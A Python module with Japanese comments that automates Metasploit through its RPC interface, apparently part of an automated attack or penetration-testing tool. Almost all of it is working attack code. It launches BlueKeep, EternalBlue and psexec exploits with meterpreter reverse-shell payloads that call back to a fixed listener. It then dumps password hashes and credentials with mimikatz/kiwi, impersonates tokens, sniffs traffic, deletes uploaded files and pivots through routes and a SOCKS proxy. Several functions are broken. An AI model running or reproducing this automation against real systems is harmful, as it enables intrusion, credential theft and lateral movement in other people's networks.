# metasploit および meterpreter を実行するモジュール
from pymetasploit3.msfrpc import MsfRpcClient
import time
import datetime
import re
import json
import copy

class MetaSploit():
  def __init__(self):
    print("init metasploit..")

  # msfrpc への接続
  def msf_connection(self):
    client = MsfRpcClient('test', port=55553)
    time.sleep(10)
    return client

  # exploit の成否のチェック
  def check_exploit(self, i, uuid, sessions_list):

    if sessions_list:
      print("sessions_list = {}".format(sessions_list))

      for key in sessions_list.keys():
        print("key = {}".format(key))

        if uuid == sessions_list[key]["exploit_uuid"]:
          print("match key = {}".format(key))
          print("exploit_uuid = {}".format(sessions_list[key]["exploit_uuid"]))
          print("exploit success..!!")
          return 0
          #break
        else:
          print("exploit failed..")
    else:
      print("sessions_list = {}".format(sessions_list))
      print("exploit failed..")
      if i == 2: # 3回失敗したら終了
        print("three times exploit failed..")
        return -1
      #continue

    # else-continue, break の構文
    # 外側のループを抜ける
    #break


  # BlueKeep の実行
  def execute_bluekeep(self, ipaddr):
    client = self.msf_connection()

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    # exploit の設定
    exploit = client.modules.use('exploit', 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce')
    #exploit['RHOSTS'] = '192.168.11.3'
    exploit['RHOSTS'] = ipaddr
    exploit.target = 8
    
    # payload の設定
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    #payload['LHOST'] = '192.168.11.33'
    payload['LHOST'] = '10.1.200.123' # 自動で入力させる必要がある
    payload['LPORT'] = '4444'
    
    print(exploit.runoptions)
    print(payload.runoptions)
    
    # exploit の実行(失敗したら3回まで実行)
    for i in range(3):
      exploit_id = exploit.execute(payload=payload)
      job_id = exploit_id['job_id']
      uuid = exploit_id['uuid']

      print("exploit_id = {}".format(exploit_id))
      print("job_id = {}".format(job_id))
      print("uuid = {}".format(uuid))

      print("execute exploit...")
      time.sleep(60)

      res = self.check_exploit(i, uuid, client.sessions.list)

      # exploit が成功していた場合
      if res == 0:
        break

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)
    
    # meterpreter にコマンドを送信し、結果を取得
    client.sessions.session(session_num[0]).write('pwd')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())
  
    client.sessions.session(session_num[0]).write('sysinfo')
    time.sleep(15)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('ipconfig')
    time.sleep(15)
    print(client.sessions.session(session_num[0]).read())


  # eternalblue の実行
  def execute_eternalblue(self, ipaddr, num, node):
    client = self.msf_connection()

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    # exploit の設定
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    #exploit['RHOSTS'] = '192.168.11.3'
    exploit['RHOSTS'] = ipaddr
    
    # payload の設定
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    #payload['LHOST'] = '192.168.11.33'
    payload['LHOST'] = '10.1.200.123' # 自動で入力させる必要がある
    payload['LPORT'] = '443'
    
    print(exploit.runoptions)
    print(payload.runoptions)
    
    # exploit の実行(失敗したら3回まで実行)
    for i in range(3):
      exploit_id = exploit.execute(payload=payload)
      job_id = exploit_id['job_id']
      uuid = exploit_id['uuid']

      print("exploit_id = {}".format(exploit_id))
      print("job_id = {}".format(job_id))
      print("uuid = {}".format(uuid))

      print("execute exploit...")
      time.sleep(60)

      res = self.check_exploit(i, uuid, client.sessions.list)

      # exploit が成功していた場合
      if res == 0:
        break

    # セッション情報を別リストに格納
    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)
  
      node[num]['session'] = session_num[-1]
  
      return 0
    else: # 攻撃に失敗した時
      return -1
    
    # meterpreter にコマンドを送信し、結果を取得
    #client.sessions.session(node[num]['session']).write('pwd')
    #time.sleep(10)
    #print(client.sessions.session(node[num]['session']).read())
  
    #client.sessions.session(node[num]['session']).write('sysinfo')
    #time.sleep(15)
    #print(client.sessions.session(node[num]['session']).read())

    #client.sessions.session(node[num]['session']).write('ipconfig')
    #time.sleep(15)
    #print(client.sessions.session(node[num]['session']).read())

  
  # ms17_010 psexec の実行
  def execute_ms17_10_psexec(self, ipaddr, num, node):
    client = self.msf_connection()

    # exploit の設定
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
    exploit['RHOSTS'] = ipaddr
    exploit['SMBUser'] = node[num]["local_account_hash"][2]
    exploit['SMBPass'] = node[num]["local_account_hash"][3]
    
    # payload の設定
    payload = client.modules.use('payload', 'windows/x64/meterpreter/bind_tcp')
    payload['LPORT'] = '4445'
    
    print("exploit runoptions = {}".format(exploit.runoptions))
    print("exploit payload = {}".format(payload.runoptions))
    
    # exploit の実行(失敗したら3回まで実行)
    for i in range(3):
      exploit_id = exploit.execute(payload=payload)
      job_id = exploit_id['job_id']
      uuid = exploit_id['uuid']

      print("exploit_id = {}".format(exploit_id))
      print("job_id = {}".format(job_id))
      print("uuid = {}".format(uuid))

      print("execute exploit...")
      time.sleep(60)

      res = self.check_exploit(i, uuid, client.sessions.list)

      # exploit が成功していた場合
      if res == 0:
        break

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    # meterpreter にコマンドを送信し、結果を取得
    client.sessions.session(session_num[-1]).write('pwd')
    time.sleep(10)
    print(client.sessions.session(session_num[-1]).read())
  
    client.sessions.session(session_num[-1]).write('sysinfo')
    time.sleep(15)
    print(client.sessions.session(session_num[-1]).read())

    client.sessions.session(session_num[-1]).write('ipconfig')
    time.sleep(15)
    print(client.sessions.session(session_num[-1]).read())


  # psexec の実行
  def execute_psexec(self, ipaddr, smbuser, smbpass, smbdomain):
    client = self.msf_connection()

    # exploit の設定
    exploit = client.modules.use('exploit', 'windows/smb/psexec')
    exploit['RHOSTS'] = ipaddr
    exploit['SMBUser'] = smbuser
    exploit['SMBPass'] = smbpass
    exploit['SMBDomain'] = smbdomain
    
    # payload の設定
    payload = client.modules.use('payload', 'windows/x64/meterpreter/bind_tcp')
    payload['LPORT'] = '555'
    
    print(exploit.runoptions)
    print(payload.runoptions)
    
    # exploit の実行(失敗したら3回まで実行)
    for i in range(3):
      exploit_id = exploit.execute(payload=payload)
      job_id = exploit_id['job_id']
      uuid = exploit_id['uuid']

      print("exploit_id = {}".format(exploit_id))
      print("job_id = {}".format(job_id))
      print("uuid = {}".format(uuid))

      print("execute exploit...")
      time.sleep(60)

      res = self.check_exploit(i, uuid, client.sessions.list)

      # exploit が成功していた場合
      if res == 0:
        break

    # セッション情報を別リストに格納
    if res == 0:
      session_num = []
      
      print("Sessions avaiables : ")
      for s in client.sessions.list.keys():
        session_num.append(str(s))
        print(session_num)

      # meterpreter にコマンドを送信し、結果を取得
      client.sessions.session(session_num[-1]).write('pwd')
      time.sleep(10)
      print(client.sessions.session(session_num[-1]).read())
  
      client.sessions.session(session_num[-1]).write('sysinfo')
      time.sleep(15)
      print(client.sessions.session(session_num[-1]).read())

      client.sessions.session(session_num[-1]).write('ipconfig')
      time.sleep(15)
      print(client.sessions.session(session_num[-1]).read())

      return 0
    else: # 攻撃に失敗した時
      return -1


  # load incognito の実行
  def execute_incognito(self):
    client = self.msf_connection()

    print("execute incognito..")

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num[0]).write('load incognito')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('list_tokens -u')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('impersonate_token mushikago-PC\\\\mushikago')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())

    client.sessions.session(session_num[0]).write('rev2self')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())


  # network sniffing の実行
  def execute_sniff(self, num, node):
    client = self.msf_connection()

    print("execute network sniffing..")

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    # セッション情報を別リストに格納
    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    client.sessions.session(session_num).write('load sniffer')
    time.sleep(10)
    print(client.sessions.session(session_num).read())
    
    client.sessions.session(session_num).write('sniffer_interfaces')
    time.sleep(10)
    result = client.sessions.session(session_num).read()

    interface_list = []
    interface_list.clear()
    pattern = '(.*)( - ).*'

    rows = result.splitlines()
    
    # packet capture できる interface list を取得
    for row in rows:
      if "type:" in row.lower():
        result = re.match(pattern, row)
        interface_list.append(result.group(1).replace('\n', ''))
    
    #print("interface_list = {}".format(interface_list))

    # 存在する interface を順番に capture していく
    for interface in interface_list:
      client.sessions.session(session_num).write('sniffer_start ' + interface)
      time.sleep(10)
      result = client.sessions.session(session_num).read()

      if "Capture started" in result:
        print(result)

        filename = "if" + interface + "-" + node[num]["id"] + "-" + str(datetime.date.today()) + ".pcap"

        time.sleep(50)

        client.sessions.session(session_num).write('sniffer_dump ' + interface + ' ./' + filename)
        time.sleep(30)
        print(client.sessions.session(session_num).read())

        client.sessions.session(session_num).write('sniffer_stop ' + interface)
        time.sleep(10)
        print(client.sessions.session(session_num).read())

        client.sessions.session(session_num).write('sniffer_release ' + interface)
        time.sleep(10)
        print(client.sessions.session(session_num).read())

        node[num]["pcap_list"].append(filename)

      else: # capture が失敗した場合
        print("Failed capture interface {}...".format(interface))



  # kiwi(mimikatz) の実行
  def execute_kiwi(self):
    client = self.msf_connection()

    print("execute kiwi..")

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    client.sessions.session(session_num[0]).write('load kiwi')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())
    
    client.sessions.session(session_num[0]).write('lsa_dump_sam')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())
  
    client.sessions.session(session_num[0]).write('lsa_dump_secrets')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())
    
    client.sessions.session(session_num[0]).write('creds_all')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())


  # systeminfo を実行し、出力結果を取得し、ファイルを削除する
  def execute_systeminfo(self):
    client = self.msf_connection()

    print("execute systeminfo..")

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)
  
    client.sessions.session(session_num[0]).write('upload ./bat/sysinfo.bat')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())
  
    client.sessions.session(session_num[0]).write('execute -f sysinfo.bat')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())
  
    client.sessions.session(session_num[0]).write('download sysinfo.txt')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())
  
    client.sessions.session(session_num[0]).write('rm sysinfo.txt sysinfo.bat')
    time.sleep(20)
    print(client.sessions.session(session_num[0]).read())


  # arp-scan.exe を実行し、出力結果を取得し、ファイルを削除する
  def execute_arpscan(self, ipaddr, cidr):
    client = self.msf_connection()

    with open('./bat/arp-scan.bat', 'w') as f:
      f.write(".\\arp-scan.exe -t " + ipaddr + cidr + " > arp-scan.log")

    print("execute arp-scan..")

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)
  
    client.sessions.session(session_num[-1]).write('upload ./bin/arp-scan.exe')
    time.sleep(10)
    print(client.sessions.session(session_num[-1]).read())

    client.sessions.session(session_num[-1]).write('upload ./bat/arp-scan.bat')
    time.sleep(10)
    print(client.sessions.session(session_num[-1]).read())
  
    client.sessions.session(session_num[-1]).write('execute -f arp-scan.bat')
    time.sleep(120)
    print(client.sessions.session(session_num[-1]).read())
  
    client.sessions.session(session_num[-1]).write('download arp-scan.log')
    time.sleep(30)
    print(client.sessions.session(session_num[-1]).read())
  
    client.sessions.session(session_num[-1]).write('rm arp-scan.exe arp-scan.bat arp-scan.log')
    time.sleep(20)
    print(client.sessions.session(session_num[-1]).read())


  # ルーティングの設定
  def setting_route(self, network_addr, netmask):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    cid = client.consoles.console().cid
    print('cid = {}'.format(cid))

    # ルーティングの設定
    route = 'route add' + " " + network_addr + " " + netmask + " " + session_num[-1]
    print(route)

    client.consoles.console(cid).write(route)
    time.sleep(10)
    print(client.consoles.console(cid).read())

    client.consoles.console(cid).write('route print')
    time.sleep(10)
    print(client.consoles.console(cid).read())


  # socks プロキシの起動
  def execute_socks(self):
    client = self.msf_connection()

    run = client.modules.use('auxiliary', 'server/socks_proxy')
    print(run.runoptions)
    job_id = run.execute()
    print(job_id)


  # ハッシュ値のスクレイピング
  def hash_scrape(self, hashdump):
    #print(hashdump)

    pass_list = []
    hash_list = []
    pass_list.clear()
    hash_list.clear()

    pettern_user_pass = '\[\+\]\s{2}(.*?):"(.*)"'
    pettern_user_hash = '\[\+\]\s{2}(.*?):(.*?):(.*?):::'
  
    #print(res)
    #print(len(res))
  
    # ユーザとパスワードの取得
    res = re.findall(pettern_user_pass, hashdump)

    for i in range(len(res)):
      #print(res[i][0])
      #print(res[i][1])
      pass_list.append(res[i][0])
      pass_list.append(res[i][1].replace('\u0000', ''))

    # ユーザとhash値の取得
    res = re.findall(pettern_user_hash, hashdump)

    for i in range(len(res)):
      #print(res[i][0])
      #print(res[i][1])
      hash_list.append(res[i][0])
      hash_list.append(res[i][2])

    return pass_list, hash_list

  # ハッシュ値の取得
  def get_hash(self, ipaddr, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    session_num = node[num]['session']

    pass_list = []
    hash_list = []

    # meterpreter コマンド実行
    client.sessions.session(session_num).write('run post/windows/gather/smart_hashdump')
    time.sleep(10)
    hashdump = client.sessions.session(session_num).read()
    print(hashdump)

    # hash値の抽出
    pass_list, hash_list = self.hash_scrape(hashdump)
    print("pass_list = {}".format(pass_list))
    print("hash_list = {}".format(hash_list))

    node[num]['local_account_pass'] = pass_list
    node[num]['local_account_hash'] = hash_list

    #print("smbuser = {}, smbpass = {}".format(smbuser, smbpass))
    #node[num]['local_account_hash'].append(smbuser)
    #node[num]['local_account_hash'].append(smbpass)
    #return smbuser, smbpass


  # 仮想環境のチェック
  def check_vm():
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = []
    
    print("Sessions avaiables : ")
    for s in client.sessions.list.keys():
      session_num.append(str(s))
      print(session_num)

    # meterpreter コマンド実行
    client.sessions.session(session_num[0]).write('run post/windows/gather/checkvm')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())

    
  # DC のチェック
  def check_dc():
    # meterpreter コマンド実行
    client.sessions.session(session_num[0]).write('run post/windows/gather/enum_domain')
    time.sleep(10)
    print(client.sessions.session(session_num[0]).read())


  # zerologon(cve-2020-1472) の実行
  def execute_zerologon():
    client = self.msf_connection()

    # exploit の設定
    exploit = client.modules.use('auxiliary', 'admin/dcerpc/cve_2020_1472_zerologon')
    exploit['NMNAME'] = "WIN-XXXX"
    exploit['RHOSTS'] = ipaddr
    exploit['SMBPass'] = smbpass

    exploit.check()


  # ipconfig から IP アドレスを取得
  def execute_ipconfig(self, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # meterpreter にて ipconfig コマンド実行
    client.sessions.session(session_num).write('ipconfig')
    time.sleep(10)
    result = client.sessions.session(session_num).read()

    ipaddr_info = []
    pattern = '.*( : )(.*)'
    
    rows = result.splitlines()
    
    for row in rows:
      if "ipv4 address" in row.lower():
        result = re.match(pattern, row)
        if (result.group(2) == "127.0.0.1"):
          loopback = 1
        else:
          ipaddr_info.append(result.group(2).replace('\n', ''))
      if "ipv4 netmask" in row.lower():
        result = re.match(pattern, row)
        if (loopback == 1):
          loopback = 0
        else:
          ipaddr_info.append(result.group(2).replace('\n', ''))
    
    print("ipconfig info = {}".format(ipaddr_info))
    node[num]['network_info'] = copy.deepcopy(ipaddr_info)

    ipaddr_info.clear()


  # netstat から establish な 接続先 IP アドレスを取得
  def execute_netstat(self, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # meterpreter にて netstat コマンド実行
    client.sessions.session(session_num).write('netstat')
    time.sleep(10)
    result = client.sessions.session(session_num).read()

    netstat_info = []
    pattern = '(.*):(.*)'

    rows = result.splitlines()
    
    for row in rows:
      if "established" in row.lower():
        c = row.split()
        result = re.match(pattern, c[2])
        netstat_info.append(result.group(1).replace('\n', ''))
        netstat_info.append(result.group(2).replace('\n', ''))
    
    print("established network info = {}".format(netstat_info))
    node[num]['netstat_info'] = copy.deepcopy(netstat_info)

    netstat_info.clear()


  # ps からセキュリティ製品がないか判別
  def execute_ps(self, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # meterpreter にて ps コマンド実行
    client.sessions.session(session_num).write('ps')
    time.sleep(10)
    result = client.sessions.session(session_num).read()

    rows = result.splitlines()
    ps_list = []

    # ps コマンドからプロセスを抽出
    for row in rows:
      c = row.split()
      if len(c) >= 7 and ".exe" in c[2]:
        ps_list.append(c[2])
        #print("process = {}".format(c[2]))

    print("ps_list = {}".format(ps_list))

    # プロセスリストを保存
    node[num]['process_list'] = copy.deepcopy(ps_list)

    # JSON から製品名を取り出し
    json_open = open('./arsenal/security_tool.json', 'r')
    json_load = json.load(json_open)

    st_list = []
    
    for key, values in json_load.items():
      #print(key)
      for value in values:
        for ps in ps_list:
          # セキュリティ製品のプロセスがないかチェック
          if (value.lower() + ".exe" == ps.lower()):
            st_list.append(key)
            break

    print("st_list = {}".format(st_list))

    # セキュリティツールを保存
    node[num]['security_tool'] = copy.deepcopy(st_list)

    ps_list.clear()
    st_list.clear()



  # net user からローカルアカウントの一覧を取得
  def execute_netuser(self, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # net user コマンド実行
    client.sessions.session(session_num).write('upload ./bat/net-user.bat')
    time.sleep(10)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('execute -f net-user.bat')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('download net-user.log')
    time.sleep(30)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('rm net-user.bat net-user.log')
    time.sleep(20)
    print(client.sessions.session(session_num).read())

    # net-user.log からローカルアカウントを取得
    local_account= []
    flag = 0

    with open('net-user.log', 'r') as f:
      for row in f:
        # 終了判定
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        # ユーザアカウントの取得
        if flag == 1:
          #print(row)
          c = row.split()
          local_account += c
        # 開始判定
        if '-------' in row:
          flag = 1
    
    print("local account list = {}".format(local_account))
    node[num]['local_account_list'] = copy.deepcopy(local_account)

    local_account.clear()


  # net user /domain からドメインアカウントの一覧を取得
  def execute_netuserdomain(self, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # net user /domain を実行
    client.sessions.session(session_num).write('upload ./bat/net-user-domain.bat')
    time.sleep(10)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('execute -f net-user-domain.bat')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('download net-user-domain.log')
    time.sleep(30)
    print(client.sessions.session(session_num).read())

    client.sessions.session(session_num).write('rm net-user-domain.bat net-user-domain.log')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
  
    # net-user-domain.log からドメインユーザを抽出
    pattern = '.*(for domain )(.*)'
    domain_account= []
    flag = 0
    
    with open('net-user-domain.log', 'r') as f:
      for row in f:
        # 終了判定
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        # domain 特定
        if 'request' in row.lower() and "processed" in row.lower():
          result = re.match(pattern, row)
          domain_info = result.group(2)[:-1] # 最後の一文字（ドット）を削除
          print("domain_info = {}".format(domain_info))
        elif '要求' in row.lower() and "処理" in row.lower():
          result = re.match(pattern, row)
          domain_info = result.group(2)[:-1] # 最後の一文字（ドット）を削除
          print("domain_info = {}".format(domain_info))
        # ユーザアカウントの取得
        if flag == 1:
          #print(row)
          c = row.split()
          domain_account += c
        # 開始判定
        if '-------' in row:
          flag = 1
    
    print("domain account list = {}".format(domain_account))
    node[num]['domain_account_list'] = copy.deepcopy(domain_account)

    domain_account.clear()


  # net use からネットワークドライブの一覧を取得
  def execute_netuse(self, num, node):
    client = self.msf_connection()

    # セッション情報を別リストに格納
    session_num = node[num]['session']

    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # net use コマンド実行
    client.sessions.session(session_num).write('upload ./bat/net-use.bat')
    time.sleep(10)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('execute -f net-use.bat')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
  
    client.sessions.session(session_num).write('download net-use.log')
    time.sleep(30)
    print(client.sessions.session(session_num).read())

    client.sessions.session(session_num).write('rm net-use.bat net-use.log')
    time.sleep(20)
    print(client.sessions.session(session_num).read())

    # net-user.log からドメインユーザを抽出
    nw_drive = []
    flag = 0

    with open('net-use.log', 'r') as f:
      for row in f:
        # 終了判定
        if 'command' in row.lower() and "completed" in row.lower():
          break
        elif 'コマンド' in row.lower() and "終了" in row.lower():
          break
        # ネットワークドライブを取得
        if flag == 1:
          #print(row)
          c = row.split()
          nw_drive.append(c[2])
        # 開始判定
        if '-------' in row:
          flag = 1

    print("network drive list = {}".format(nw_drive))
    node[num]['network_drive'] = copy.deepcopy(nw_drive)

    nw_drive.clear()


  # creds tspkg からドメインアカウントとパスワードを取得
  def execute_creds_tspkg(self, num, node):
    client = self.msf_connection()

    session_num = node[num]['session']

    # セッション情報を別リストに格納
    #session_num = []
    #
    #print("Sessions avaiables : ")
    #for s in client.sessions.list.keys():
    #  session_num.append(str(s))
    #  print(session_num)

    # kiwi にて creds tspkg コマンド実行
    client.sessions.session(session_num).write('load kiwi')
    time.sleep(20)
    print(client.sessions.session(session_num).read())
    
    client.sessions.session(session_num).write('creds_tspkg')
    time.sleep(10)
    result = client.sessions.session(session_num).read()
    print(result)

    rows = result.splitlines()
    domain_list = []
    flag = 0
    
    for row in rows:
      # ユーザアカウントの取得
      if flag == 1:
        #print(row)
        domain_list += row.split()
      # 開始判定
      if '-------' in row:
        flag = 1
    flag = 0
    
    print("domain password = {}".format(domain_list))
    node[num]['domain_account_pass'] = copy.deepcopy(domain_list)
    
    domain_list.clear()
